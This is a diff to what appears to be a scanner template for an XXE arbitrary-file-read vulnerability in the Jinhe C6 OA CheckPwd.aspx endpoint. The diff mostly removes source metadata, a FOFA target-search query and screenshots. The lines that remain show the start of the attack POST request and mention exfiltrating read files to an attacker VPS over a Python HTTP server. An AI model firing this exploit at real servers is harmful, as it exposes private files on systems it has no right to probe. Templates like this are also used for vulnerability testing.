@@ -3,12 +3,8 @@ info:
   name: 金和C6 CheckPwd.aspx XML实体注入致任意文件读取漏洞 - 副本
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gcwevoehquue25og'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gcwevoehquue25og
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'POST /C6/JHSoft.Web.WorkFlat/CheckPwd.aspx/ HTTP/1.1
@@ -69,13 +65,7 @@ http:
     python开启http服务，发送请求
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121737103-2ada3240-2b5f-4d0a-ab67-658b3baf2fd7.png)
-
-
-    读取的文件内容会回显到VPS
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121737262-2a692774-6908-4b51-9360-820406ff4478.png)'
+    读取的文件内容会回显到VPS'
   redirects: false
   matchers:
   - status:
